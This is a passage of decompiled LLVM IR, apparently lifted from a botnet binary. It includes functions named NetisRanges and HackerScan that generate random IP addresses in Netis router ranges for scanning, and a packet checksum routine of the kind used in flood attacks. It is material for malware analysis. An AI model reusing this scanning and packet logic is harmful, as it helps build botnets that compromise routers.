  store i32 %v3_804c2fb, i32* @ebx, align 4
  ret i32 %v1_804c2f3

; uselistorder directives
  uselistorder i32 %v2_804c145, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208 }
  uselistorder i32 198, { 1, 0 }
  uselistorder label %dec_label_pc_804c2ec, { 1, 0 }
  uselistorder label %dec_label_pc_804c2b9, { 1, 0 }
  uselistorder label %dec_label_pc_804c286, { 1, 0 }
  uselistorder label %dec_label_pc_804c253, { 1, 0 }
  uselistorder label %dec_label_pc_804c220, { 1, 0 }
  uselistorder label %dec_label_pc_804c1ed, { 1, 0 }
  uselistorder label %dec_label_pc_804c1ba, { 1, 0 }
  uselistorder label %dec_label_pc_804c187, { 1, 0 }
  uselistorder label %dec_label_pc_804c121, { 1, 0 }
  uselistorder label %dec_label_pc_804c0ee, { 1, 0 }
  uselistorder label %dec_label_pc_804c0bb, { 1, 0 }
  uselistorder label %dec_label_pc_804c088, { 1, 0 }
  uselistorder label %dec_label_pc_804c055, { 1, 0 }
  uselistorder label %dec_label_pc_804c022, { 1, 0 }
  uselistorder label %dec_label_pc_804bfef, { 1, 0 }
  uselistorder label %dec_label_pc_804bfbc, { 1, 0 }
  uselistorder label %dec_label_pc_804bf89, { 1, 0 }
  uselistorder label %dec_label_pc_804bf56, { 1, 0 }
  uselistorder label %dec_label_pc_804bf23, { 1, 0 }
  uselistorder label %dec_label_pc_804bef0, { 1, 0 }
  uselistorder label %dec_label_pc_804bebd, { 1, 0 }
  uselistorder label %dec_label_pc_804be8a, { 1, 0 }
  uselistorder label %dec_label_pc_804be57, { 1, 0 }
  uselistorder label %dec_label_pc_804be24, { 1, 0 }
  uselistorder label %dec_label_pc_804bdf1, { 1, 0 }
  uselistorder label %dec_label_pc_804bdbe, { 1, 0 }
  uselistorder label %dec_label_pc_804bd8b, { 1, 0 }
  uselistorder label %dec_label_pc_804bd58, { 1, 0 }
  uselistorder label %dec_label_pc_804bd25, { 1, 0 }
  uselistorder label %dec_label_pc_804bcf2, { 1, 0 }
  uselistorder label %dec_label_pc_804bcbf, { 1, 0 }
  uselistorder label %dec_label_pc_804bc8c, { 1, 0 }
  uselistorder label %dec_label_pc_804bc59, { 1, 0 }
  uselistorder label %dec_label_pc_804bc26, { 1, 0 }
  uselistorder label %dec_label_pc_804bbf3, { 1, 0 }
  uselistorder label %dec_label_pc_804bbc0, { 1, 0 }
  uselistorder label %dec_label_pc_804bb8d, { 1, 0 }
  uselistorder label %dec_label_pc_804bb5a, { 1, 0 }
  uselistorder label %dec_label_pc_804bb27, { 1, 0 }
  uselistorder label %dec_label_pc_804baf4, { 1, 0 }
  uselistorder label %dec_label_pc_804bac1, { 1, 0 }
  uselistorder label %dec_label_pc_804ba8e, { 1, 0 }
  uselistorder label %dec_label_pc_804ba5b, { 1, 0 }
  uselistorder label %dec_label_pc_804ba28, { 1, 0 }
  uselistorder label %dec_label_pc_804b9f5, { 1, 0 }
  uselistorder label %dec_label_pc_804b9c2, { 1, 0 }
  uselistorder label %dec_label_pc_804b98f, { 1, 0 }
  uselistorder label %dec_label_pc_804b95c, { 1, 0 }
  uselistorder label %dec_label_pc_804b929, { 1, 0 }
  uselistorder label %dec_label_pc_804b8f6, { 1, 0 }
  uselistorder label %dec_label_pc_804b8c3, { 1, 0 }
  uselistorder label %dec_label_pc_804b890, { 1, 0 }
  uselistorder label %dec_label_pc_804b85d, { 1, 0 }
  uselistorder label %dec_label_pc_804b82a, { 1, 0 }
  uselistorder label %dec_label_pc_804b7f7, { 1, 0 }
  uselistorder label %dec_label_pc_804b7c4, { 1, 0 }
  uselistorder label %dec_label_pc_804b791, { 1, 0 }
  uselistorder label %dec_label_pc_804b75e, { 1, 0 }
  uselistorder label %dec_label_pc_804b72b, { 1, 0 }
  uselistorder label %dec_label_pc_804b6f8, { 1, 0 }
  uselistorder label %dec_label_pc_804b6c5, { 1, 0 }
  uselistorder label %dec_label_pc_804b692, { 1, 0 }
  uselistorder label %dec_label_pc_804b65f, { 1, 0 }
  uselistorder label %dec_label_pc_804b62c, { 1, 0 }
  uselistorder label %dec_label_pc_804b5f9, { 1, 0 }
  uselistorder label %dec_label_pc_804b5c6, { 1, 0 }
  uselistorder label %dec_label_pc_804b593, { 1, 0 }
  uselistorder label %dec_label_pc_804b560, { 1, 0 }
  uselistorder label %dec_label_pc_804b52d, { 1, 0 }
  uselistorder label %dec_label_pc_804b4fa, { 1, 0 }
  uselistorder label %dec_label_pc_804b4c7, { 1, 0 }
  uselistorder label %dec_label_pc_804b494, { 1, 0 }
  uselistorder label %dec_label_pc_804b461, { 1, 0 }
  uselistorder label %dec_label_pc_804b42e, { 1, 0 }
  uselistorder label %dec_label_pc_804b3fb, { 1, 0 }
  uselistorder label %dec_label_pc_804b3c8, { 1, 0 }
  uselistorder label %dec_label_pc_804b395, { 1, 0 }
  uselistorder label %dec_label_pc_804b362, { 1, 0 }
  uselistorder label %dec_label_pc_804b32f, { 1, 0 }
  uselistorder label %dec_label_pc_804b2fc, { 1, 0 }
  uselistorder label %dec_label_pc_804b2c9, { 1, 0 }
  uselistorder label %dec_label_pc_804b299, { 1, 0 }
  uselistorder label %dec_label_pc_804b269, { 1, 0 }
  uselistorder label %dec_label_pc_804b239, { 1, 0 }
  uselistorder label %dec_label_pc_804b209, { 1, 0 }
  uselistorder label %dec_label_pc_804b1d9, { 1, 0 }
  uselistorder label %dec_label_pc_804b1a9, { 1, 0 }
  uselistorder label %dec_label_pc_804b179, { 1, 0 }
  uselistorder label %dec_label_pc_804b149, { 1, 0 }
  uselistorder label %dec_label_pc_804b119, { 1, 0 }
  uselistorder label %dec_label_pc_804b0e9, { 1, 0 }
  uselistorder label %dec_label_pc_804b0b9, { 1, 0 }
  uselistorder label %dec_label_pc_804b089, { 1, 0 }
  uselistorder label %dec_label_pc_804b059, { 1, 0 }
  uselistorder label %dec_label_pc_804b029, { 1, 0 }
  uselistorder label %dec_label_pc_804aff9, { 1, 0 }
  uselistorder label %dec_label_pc_804afc9, { 1, 0 }
  uselistorder label %dec_label_pc_804af99, { 1, 0 }
  uselistorder label %dec_label_pc_804af69, { 1, 0 }
  uselistorder label %dec_label_pc_804af39, { 1, 0 }
  uselistorder label %dec_label_pc_804af09, { 1, 0 }
  uselistorder label %dec_label_pc_804aed9, { 1, 0 }
  uselistorder label %dec_label_pc_804aea9, { 1, 0 }
  uselistorder label %dec_label_pc_804ae79, { 1, 0 }
  uselistorder label %dec_label_pc_804ae49, { 1, 0 }
  uselistorder label %dec_label_pc_804ae19, { 1, 0 }
  uselistorder label %dec_label_pc_804ade9, { 1, 0 }
  uselistorder label %dec_label_pc_804adb9, { 1, 0 }
  uselistorder label %dec_label_pc_804ad89, { 1, 0 }
  uselistorder label %dec_label_pc_804ad59, { 1, 0 }
  uselistorder label %dec_label_pc_804ad29, { 1, 0 }
  uselistorder label %dec_label_pc_804acf9, { 1, 0 }
  uselistorder label %dec_label_pc_804acc9, { 1, 0 }
  uselistorder label %dec_label_pc_804ac99, { 1, 0 }
  uselistorder label %dec_label_pc_804ac69, { 1, 0 }
  uselistorder label %dec_label_pc_804ac39, { 1, 0 }
  uselistorder label %dec_label_pc_804ac09, { 1, 0 }
  uselistorder label %dec_label_pc_804abd9, { 1, 0 }
  uselistorder label %dec_label_pc_804aba9, { 1, 0 }
  uselistorder label %dec_label_pc_804ab79, { 1, 0 }
  uselistorder label %dec_label_pc_804ab49, { 1, 0 }
  uselistorder label %dec_label_pc_804ab19, { 1, 0 }
  uselistorder label %dec_label_pc_804aae9, { 1, 0 }
  uselistorder label %dec_label_pc_804aab9, { 1, 0 }
  uselistorder label %dec_label_pc_804aa89, { 1, 0 }
  uselistorder label %dec_label_pc_804aa59, { 1, 0 }
  uselistorder label %dec_label_pc_804aa29, { 1, 0 }
  uselistorder label %dec_label_pc_804a9f9, { 1, 0 }
  uselistorder label %dec_label_pc_804a9c9, { 1, 0 }
  uselistorder label %dec_label_pc_804a999, { 1, 0 }
  uselistorder label %dec_label_pc_804a969, { 1, 0 }
  uselistorder label %dec_label_pc_804a939, { 1, 0 }
  uselistorder label %dec_label_pc_804a909, { 1, 0 }
  uselistorder label %dec_label_pc_804a8d9, { 1, 0 }
  uselistorder label %dec_label_pc_804a8a9, { 1, 0 }
  uselistorder label %dec_label_pc_804a879, { 1, 0 }
  uselistorder label %dec_label_pc_804a849, { 1, 0 }
  uselistorder label %dec_label_pc_804a819, { 1, 0 }
  uselistorder label %dec_label_pc_804a7e9, { 1, 0 }
  uselistorder label %dec_label_pc_804a7b9, { 1, 0 }
  uselistorder label %dec_label_pc_804a789, { 1, 0 }
  uselistorder label %dec_label_pc_804a759, { 1, 0 }
  uselistorder label %dec_label_pc_804a729, { 1, 0 }
  uselistorder label %dec_label_pc_804a6f9, { 1, 0 }
  uselistorder label %dec_label_pc_804a6c9, { 1, 0 }
  uselistorder label %dec_label_pc_804a699, { 1, 0 }
  uselistorder label %dec_label_pc_804a669, { 1, 0 }
  uselistorder label %dec_label_pc_804a639, { 1, 0 }
  uselistorder label %dec_label_pc_804a609, { 1, 0 }
  uselistorder label %dec_label_pc_804a5d9, { 1, 0 }
  uselistorder label %dec_label_pc_804a5a9, { 1, 0 }
  uselistorder label %dec_label_pc_804a579, { 1, 0 }
  uselistorder label %dec_label_pc_804a549, { 1, 0 }
  uselistorder label %dec_label_pc_804a519, { 1, 0 }
  uselistorder label %dec_label_pc_804a4e9, { 1, 0 }
  uselistorder label %dec_label_pc_804a4b9, { 1, 0 }
  uselistorder label %dec_label_pc_804a489, { 1, 0 }
  uselistorder label %dec_label_pc_804a459, { 1, 0 }
  uselistorder label %dec_label_pc_804a429, { 1, 0 }
  uselistorder label %dec_label_pc_804a3f9, { 1, 0 }
  uselistorder label %dec_label_pc_804a3c9, { 1, 0 }
  uselistorder label %dec_label_pc_804a399, { 1, 0 }
  uselistorder label %dec_label_pc_804a369, { 1, 0 }
  uselistorder label %dec_label_pc_804a339, { 1, 0 }
  uselistorder label %dec_label_pc_804a309, { 1, 0 }
  uselistorder label %dec_label_pc_804a2d9, { 1, 0 }
  uselistorder label %dec_label_pc_804a2a9, { 1, 0 }
  uselistorder label %dec_label_pc_804a279, { 1, 0 }
  uselistorder label %dec_label_pc_804a249, { 1, 0 }
  uselistorder label %dec_label_pc_804a219, { 1, 0 }
  uselistorder label %dec_label_pc_804a1e9, { 1, 0 }
  uselistorder label %dec_label_pc_804a1b9, { 1, 0 }
  uselistorder label %dec_label_pc_804a189, { 1, 0 }
  uselistorder label %dec_label_pc_804a159, { 1, 0 }
  uselistorder label %dec_label_pc_804a129, { 1, 0 }
  uselistorder label %dec_label_pc_804a0f9, { 1, 0 }
  uselistorder label %dec_label_pc_804a0c9, { 1, 0 }
  uselistorder label %dec_label_pc_804a099, { 1, 0 }
  uselistorder label %dec_label_pc_804a069, { 1, 0 }
  uselistorder label %dec_label_pc_804a039, { 1, 0 }
  uselistorder label %dec_label_pc_804a009, { 1, 0 }
  uselistorder label %dec_label_pc_8049fd9, { 1, 0 }
  uselistorder label %dec_label_pc_8049fa9, { 1, 0 }
  uselistorder label %dec_label_pc_8049f79, { 1, 0 }
  uselistorder label %dec_label_pc_8049f49, { 1, 0 }
  uselistorder label %dec_label_pc_8049f19, { 1, 0 }
  uselistorder label %dec_label_pc_8049ee9, { 1, 0 }
  uselistorder label %dec_label_pc_8049eb9, { 1, 0 }
  uselistorder label %dec_label_pc_8049e89, { 1, 0 }
  uselistorder label %dec_label_pc_8049e59, { 1, 0 }
  uselistorder label %dec_label_pc_8049e29, { 1, 0 }
  uselistorder label %dec_label_pc_8049df9, { 1, 0 }
  uselistorder label %dec_label_pc_8049dc9, { 1, 0 }
  uselistorder label %dec_label_pc_8049d99, { 1, 0 }
  uselistorder label %dec_label_pc_8049d69, { 1, 0 }
  uselistorder label %dec_label_pc_8049d39, { 1, 0 }
  uselistorder label %dec_label_pc_8049d09, { 1, 0 }
  uselistorder label %dec_label_pc_8049cd9, { 1, 0 }
  uselistorder label %dec_label_pc_8049ca9, { 1, 0 }
  uselistorder label %dec_label_pc_8049c79, { 1, 0 }
  uselistorder label %dec_label_pc_8049c49, { 1, 0 }
  uselistorder label %dec_label_pc_8049c19, { 1, 0 }
  uselistorder label %dec_label_pc_8049be9, { 1, 0 }
  uselistorder label %dec_label_pc_8049bb9, { 1, 0 }
  uselistorder label %dec_label_pc_8049b89, { 1, 0 }
  uselistorder label %dec_label_pc_8049b59, { 1, 0 }
  uselistorder label %dec_label_pc_8049b29, { 1, 0 }
  uselistorder label %dec_label_pc_8049af9, { 1, 0 }
}

define i32 @NetisRanges(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c303 = load i32, i32* @edi, align 4
  %v0_804c304 = load i32, i32* @esi, align 4
  %v0_804c305 = load i32, i32* @ebx, align 4
  store i32 %v0_804c305, i32* %stack_var_-16, align 4
  %v1_804c309 = call i32 @random()
  %v2_804c319 = udiv i32 %v1_804c309, 30
  store i32 %v2_804c319, i32* @ebx, align 4
  %v1_804c33c = mul i32 %v1_804c309, 4
  %v2_804c33c = add i32 %v1_804c33c, ptrtoint (i32* @global_var_805f5a0.229 to i32)
  %v3_804c33c = inttoptr i32 %v2_804c33c to i32*
  %v4_804c33c = load i32, i32* %v3_804c33c, align 4
  store i32 %v4_804c33c, i32* @eax, align 4
  %v1_804c343 = trunc i32 %v4_804c33c to i8
  store i8 %v1_804c343, i8* @global_var_805f8d7.27, align 1
  %v2_804c348 = call i32 @random()
  store i32 255, i32* @ebx, align 4
  %v2_804c358 = ashr i32 %v2_804c348, 31
  %v2_804c35b = zext i32 %v2_804c348 to i64
  %v4_804c35b = zext i32 %v2_804c358 to i64
  %v5_804c35b = mul nuw i64 %v4_804c35b, 4294967296
  %v6_804c35b = or i64 %v5_804c35b, %v2_804c35b
  %v10_804c35b = srem i64 %v6_804c35b, 255
  %v11_804c35b = trunc i64 %v10_804c35b to i32
  store i32 %v11_804c35b, i32* @eax, align 4
  %v1_804c35f = trunc i64 %v10_804c35b to i8
  store i8 %v1_804c35f, i8* @global_var_805f8d8.28, align 8
  %v0_804c364 = call i32 @random()
  %v2_804c374 = ashr i32 %v0_804c364, 31
  %v2_804c377 = zext i32 %v0_804c364 to i64
  %v4_804c377 = zext i32 %v2_804c374 to i64
  %v5_804c377 = mul nuw i64 %v4_804c377, 4294967296
  %v6_804c377 = or i64 %v5_804c377, %v2_804c377
  %v10_804c377 = srem i64 %v6_804c377, 255
  %v11_804c377 = trunc i64 %v10_804c377 to i32
  store i32 %v11_804c377, i32* @eax, align 4
  %v1_804c37b = trunc i64 %v10_804c377 to i8
  store i8 %v1_804c37b, i8* @global_var_805f8d9.29, align 1
  %v0_804c380 = call i32 @random()
  %v2_804c390 = ashr i32 %v0_804c380, 31
  %v2_804c393 = zext i32 %v0_804c380 to i64
  %v4_804c393 = zext i32 %v2_804c390 to i64
  %v5_804c393 = mul nuw i64 %v4_804c393, 4294967296
  %v6_804c393 = or i64 %v5_804c393, %v2_804c393
  %v10_804c393 = srem i64 %v6_804c393, 255
  %v1_804c397 = trunc i64 %v10_804c393 to i8
  store i8 %v1_804c397, i8* @global_var_805f8da.30, align 2
  store i32 0, i32* %stack_var_-36, align 4
  %v0_804c3b8 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c3b8 = zext i8 %v0_804c3b8 to i32
  store i32 %v1_804c3b8, i32* @edx, align 4
  %v0_804c3d0 = load i8, i8* @global_var_805f8d7.27, align 1
  %v1_804c3d0 = zext i8 %v0_804c3d0 to i32
  store i32 %v1_804c3d0, i32* @ebx, align 4
  %v0_804c3dc = load i8, i8* @global_var_805f8d6.230, align 2
  %v1_804c3dc = zext i8 %v0_804c3dc to i32
  %v2_804c3eb = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804c3eb, i32* @edi, align 4
  %v5_804c3f7 = call i32 @szprintf(i32 %v2_804c3eb, i32 ptrtoint ([12 x i8]* @global_var_80591bd.231 to i32), i32 %v1_804c3dc, i32 %v1_804c3d0)
  %v1_804c406 = call i32 @inet_addr(i32 %v2_804c3eb)
  %v2_804c411 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804c411, i32* @ebx, align 4
  store i32 %v0_804c304, i32* @esi, align 4
  store i32 %v0_804c303, i32* @edi, align 4
  ret i32 %v1_804c406

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i8* @global_var_805f8da.30, { 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_805f8d9.29, { 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_805f8d8.28, { 2, 1, 0 }
  uselistorder i8* @global_var_805f8d7.27, { 3, 2, 1, 0 }
}

define i32 @HackerScan(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804c41c = load i8*, i8** @global_var_8065b48.232, align 4
  %v1_804c41c = ptrtoint i8* %v0_804c41c to i32
  %v2_804c425 = call i32 @ntohl(i32 %v1_804c41c)
  %v5_804c42d = and i32 %v2_804c425, %arg1
  %v1_804c433 = call i32 @rand_cmwc(i32 %v5_804c42d)
  %v1_804c43d = sub i32 -1, %arg1
  %v2_804c43f = and i32 %v1_804c433, %v1_804c43d
  %v5_804c441 = xor i32 %v2_804c43f, %v5_804c42d
  ret i32 %v5_804c441
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804c44b = load i32, i32* @ebx, align 4
  %v4_804c47f33 = add i32 %arg2, -1
  %v9_804c47f34 = sub i32 0, %arg2
  %v10_804c47f35 = and i32 %arg2, %v9_804c47f34
  %v11_804c47f36 = icmp slt i32 %v10_804c47f35, 0
  %v12_804c47f37 = icmp eq i32 %v4_804c47f33, 0
  %v13_804c47f38 = icmp slt i32 %v4_804c47f33, 0
  %v3_804c48339 = icmp eq i1 %v13_804c47f38, %v11_804c47f36
  %v4_804c48340 = icmp eq i1 %v12_804c47f37, false
  %v5_804c48341 = and i1 %v4_804c48340, %v3_804c48339
  br i1 %v5_804c48341, label %dec_label_pc_804c45f.lr.ph, label %dec_label_pc_804c485

dec_label_pc_804c45f.lr.ph:                       ; preds = %entry
  %v4_804c462.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c45f

dec_label_pc_804c45f:                             ; preds = %dec_label_pc_804c45f.lr.ph, %dec_label_pc_804c45f
  %v4_804c462 = phi i32 [ %v4_804c462.pre, %dec_label_pc_804c45f.lr.ph ], [ %v6_804c462, %dec_label_pc_804c45f ]
  %stack_var_-24.045 = phi i16 [ 0, %dec_label_pc_804c45f.lr.ph ], [ %v9_804c474, %dec_label_pc_804c45f ]
  %stack_var_8.044 = phi i32 [ %arg2, %dec_label_pc_804c45f.lr.ph ], [ %v4_804c47b, %dec_label_pc_804c45f ]
  %stack_var_4.043 = phi i16* [ %arg1, %dec_label_pc_804c45f.lr.ph ], [ %v23_804c477, %dec_label_pc_804c45f ]
  %v3_804c47142 = phi i32 [ 0, %dec_label_pc_804c45f.lr.ph ], [ %v6_804c471, %dec_label_pc_804c45f ]
  %v4_804c45f = ptrtoint i16* %stack_var_4.043 to i32
  %v2_804c462 = load i16, i16* %stack_var_4.043, align 2
  %v3_804c462 = zext i16 %v2_804c462 to i32
  %v5_804c462 = and i32 %v4_804c462, -65536
  %v6_804c462 = or i32 %v5_804c462, %v3_804c462
  store i32 %v6_804c462, i32* @ecx, align 4
  %sext51 = mul i32 %v3_804c47142, 65536
  %v4_804c471 = sdiv i32 %sext51, 65536
  %v6_804c471 = add nsw i32 %v3_804c462, %v4_804c471
  %v11_804c471 = icmp ult i32 %v6_804c471, %v4_804c471
  %v26_804c471 = trunc i32 %v6_804c471 to i16
  %v7_804c474 = zext i1 %v11_804c471 to i16
  %v9_804c474 = add i16 %v7_804c474, %stack_var_-24.045
  %v5_804c477 = add i32 %v4_804c45f, 2
  %v23_804c477 = inttoptr i32 %v5_804c477 to i16*
  %v4_804c47b = add i32 %stack_var_8.044, -2
  %v4_804c47f = add i32 %stack_var_8.044, -3
  %v9_804c47f = sub i32 2, %stack_var_8.044
  %v10_804c47f = and i32 %v4_804c47b, %v9_804c47f
  %v11_804c47f = icmp slt i32 %v10_804c47f, 0
  %v12_804c47f = icmp eq i32 %v4_804c47f, 0
  %v13_804c47f = icmp slt i32 %v4_804c47f, 0
  %v3_804c483 = icmp eq i1 %v13_804c47f, %v11_804c47f
  %v4_804c483 = icmp eq i1 %v12_804c47f, false
  %v5_804c483 = and i1 %v4_804c483, %v3_804c483
  br i1 %v5_804c483, label %dec_label_pc_804c45f, label %dec_label_pc_804c485

dec_label_pc_804c485:                             ; preds = %dec_label_pc_804c45f, %entry
  %v3_804c471.lcssa = phi i16 [ 0, %entry ], [ %v26_804c471, %dec_label_pc_804c45f ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_804c477, %dec_label_pc_804c45f ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_804c47b, %dec_label_pc_804c45f ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_804c474, %dec_label_pc_804c45f ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804c4c9.preheader, label %dec_label_pc_804c48b

dec_label_pc_804c48b:                             ; preds = %dec_label_pc_804c485
  %v1_804c48e = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804c48e = load i8, i8* %v1_804c48e, align 1
  %v3_804c48e = zext i8 %v2_804c48e to i32
  %v4_804c48e = load i32, i32* @ecx, align 4
  %v5_804c48e = and i32 %v4_804c48e, -256
  %v6_804c48e = or i32 %v5_804c48e, %v3_804c48e
  store i32 %v6_804c48e, i32* @ecx, align 4
  %v4_804c49c = sext i16 %v3_804c471.lcssa to i32
  %v6_804c49c = add nsw i32 %v3_804c48e, %v4_804c49c
  %v11_804c49c = icmp ult i32 %v6_804c49c, %v4_804c49c
  %v26_804c49c = trunc i32 %v6_804c49c to i16
  %v7_804c49f = zext i1 %v11_804c49c to i16
  %v9_804c49f = add i16 %v7_804c49f, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804c4c9.preheader

dec_label_pc_804c4c9.preheader:                   ; preds = %dec_label_pc_804c48b, %dec_label_pc_804c485
  %v3_804c4ae.ph = phi i16 [ %v3_804c471.lcssa, %dec_label_pc_804c485 ], [ %v26_804c49c, %dec_label_pc_804c48b ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804c485 ], [ %v9_804c49f, %dec_label_pc_804c48b ]
  %v4_804c4c920 = sext i16 %v3_804c4ae.ph to i32
  %v4_804c4cc21 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804c4cf22 = udiv i32 %v4_804c4c920, 65536
  %v4_804c4cf23 = mul i32 %v4_804c4cc21, 65536
  %v5_804c4cf24 = or i32 %v4_804c4cf23, %v3_804c4cf22
  %v2_804c4d325 = udiv i32 %v4_804c4cc21, 65536
  %v2_804c4d626 = or i32 %v5_804c4cf24, %v2_804c4d325
  %v3_804c4d627 = icmp eq i32 %v2_804c4d626, 0
  %v1_804c4da28 = icmp eq i1 %v3_804c4d627, false
  br i1 %v1_804c4da28, label %dec_label_pc_804c4a4, label %dec_label_pc_804c4dc

dec_label_pc_804c4a4:                             ; preds = %dec_label_pc_804c4c9.preheader, %dec_label_pc_804c4a4
  %v2_804c4d331 = phi i32 [ %v2_804c4d3, %dec_label_pc_804c4a4 ], [ %v2_804c4d325, %dec_label_pc_804c4c9.preheader ]
  %v5_804c4cf30 = phi i32 [ %v5_804c4cf, %dec_label_pc_804c4a4 ], [ %v5_804c4cf24, %dec_label_pc_804c4c9.preheader ]
  %v4_804c4c929 = phi i32 [ %v4_804c4c9, %dec_label_pc_804c4a4 ], [ %v4_804c4c920, %dec_label_pc_804c4c9.preheader ]
  %v2_804c4bf = add i32 %v5_804c4cf30, %v4_804c4c929
  %v7_804c4bf = icmp ult i32 %v2_804c4bf, %v4_804c4c929
  %v3_804c4c1 = zext i1 %v7_804c4bf to i32
  %v5_804c4c1 = add nuw nsw i32 %v3_804c4c1, %v2_804c4d331
  %sext = mul i32 %v2_804c4bf, 65536
  %v4_804c4c9 = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_804c4c1, 65536
  %v4_804c4cc = sdiv i32 %sext50, 65536
  %v3_804c4cf = udiv i32 %v4_804c4c9, 65536
  %v5_804c4cf = or i32 %sext50, %v3_804c4cf
  %v2_804c4d3 = udiv i32 %v4_804c4cc, 65536
  %v2_804c4d6 = or i32 %v5_804c4cf, %v2_804c4d3
  %v3_804c4d6 = icmp eq i32 %v2_804c4d6, 0
  %v1_804c4da = icmp eq i1 %v3_804c4d6, false
  br i1 %v1_804c4da, label %dec_label_pc_804c4a4, label %dec_label_pc_804c4c9.dec_label_pc_804c4dc_crit_edge

dec_label_pc_804c4c9.dec_label_pc_804c4dc_crit_edge: ; preds = %dec_label_pc_804c4a4
  store i32 %v5_804c4cf30, i32* @ecx, align 4
  br label %dec_label_pc_804c4dc

dec_label_pc_804c4dc:                             ; preds = %dec_label_pc_804c4c9.dec_label_pc_804c4dc_crit_edge, %dec_label_pc_804c4c9.preheader
  %v4_804c4c9.lcssa = phi i32 [ %v4_804c4c9, %dec_label_pc_804c4c9.dec_label_pc_804c4dc_crit_edge ], [ %v4_804c4c920, %dec_label_pc_804c4c9.preheader ]
  %v1_804c4df = urem i32 %v4_804c4c9.lcssa, 65536
  %v1_804c4e1 = xor i32 %v1_804c4df, 65535
  store i32 %v0_804c44b, i32* @ebx, align 4
  ret i32 %v1_804c4e1

; uselistorder directives
  uselistorder i32 %v5_804c4cf, { 1, 0 }
  uselistorder i32 %v4_804c4c9, { 1, 0, 2 }
  uselistorder i32 %v2_804c4d325, { 1, 0 }
  uselistorder i32 %v4_804c4cc21, { 1, 0 }
